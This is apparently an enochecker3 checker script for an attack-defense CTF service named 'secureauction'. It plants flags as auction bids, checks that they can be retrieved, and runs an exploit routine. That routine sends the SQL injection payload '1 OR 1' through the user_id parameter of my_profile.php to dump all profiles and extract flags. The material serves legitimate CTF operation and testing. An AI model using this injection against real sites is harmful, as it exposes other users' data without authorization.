from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import re
import faker
from httpx import AsyncClient, Response
from typing import Optional
from logging import LoggerAdapter



from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

import logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)


checker = Enochecker("secureauction", 8181)
app = lambda: checker.app


async def signup(client: AsyncClient, user_name, password, user_type='REGULAR'):
    signup_data = {
        "user_name": user_name,
        "password": password,
        "user_type": user_type,
        "action": "signup"
    }
    response = await client.post("index.php", data=signup_data)
    status_code = response.status_code
    if status_code in [200, 302]:
        return
    else:
        raise MumbleException(f"Failed to sign up the user. {status_code}")
    
async def login(client: AsyncClient, user_name, password, user_type='REGULAR'):
    login_data = {
        "user_name": user_name,
        "password": password,
        "user_type": user_type,
        "action": "login"
    }
    await client.post("index.php", data=login_data)


async def create_item(client: AsyncClient, item_name, start_price, item_type) -> int:
    item_data = {
        "item_name": item_name,
        "start_price": start_price,
        "item_type": item_type
    }
    response = await client.post("create_item.php", data=item_data)
    if response.status_code == 302:
        redirect_uri = response.headers['Location']
        return int(redirect_uri[redirect_uri.index("=") + 1:])
    else:
        raise MumbleException("Failed to create the item.")


async def place_bid(client: AsyncClient, item_id, bid):
    item_data = {
        "item_id": item_id,
        "bid_amount": bid
    }
    response = await client.post("place_bid.php", data=item_data)
    if response.status_code == 302:
        return
    else:
        raise MumbleException("Failed to create the item.")


@checker.putflag(0)
async def putflag_note(
        task: PutflagCheckerTaskMessage,
        db: ChainDB,
        client: AsyncClient,
        logger: LoggerAdapter,
) -> str:
    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))

    await signup(client, user_name, password, 'REGULAR')

    item_name = ''.join(random.choices(string.ascii_lowercase, k=10))

    item_id = await create_item(client, item_name, 0,  'REGULAR')
    await place_bid(client, item_id, task.flag)

    await db.set("item", (user_name, password, item_name))

    return user_name


@checker.getflag(0)
async def getflag_note(
        task: GetflagCheckerTaskMessage,
        db: ChainDB,
        logger: LoggerAdapter,
        client: AsyncClient
) -> None:
    try:
        user_name, password, item_name = await db.get("item")
    except KeyError:
        raise MumbleException("Item missing")
    await login(client, user_name, password, 'REGULAR')

    response = await client.get(f"my_profile.php")
    logger.debug(response.text)

    assert_in(task.flag, response.text, "Flag missing")


@checker.exploit(0)
async def exploit(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    searcher: FlagSearcher,
    logger: LoggerAdapter  
) -> Optional[str]:

    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))

    logger.debug(f"Generated user_name: {user_name}")
    logger.debug(f"Generated password: {password}")

    await signup(client, user_name, password)

    # SQL Injection payload, returning all records regardless of the user_id.
    SQL_INJECTION_PAYLOAD = "1 OR 1"
    exploit_url = f"/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}"

    response = await client.get(exploit_url)

    logger.debug(f"Exploit response status code: {response.status_code}")

    if response.status_code == 200:
        # look for the flag directly
        if flag := searcher.search_flag(response.text):
            return flag

        else:
            logger.warning("Flag not found in the response.")
    else:
        logger.warning("Exploit request failed.")
        raise MumbleException("Exploit Failed!")

if __name__ == "__main__":
    checker.run()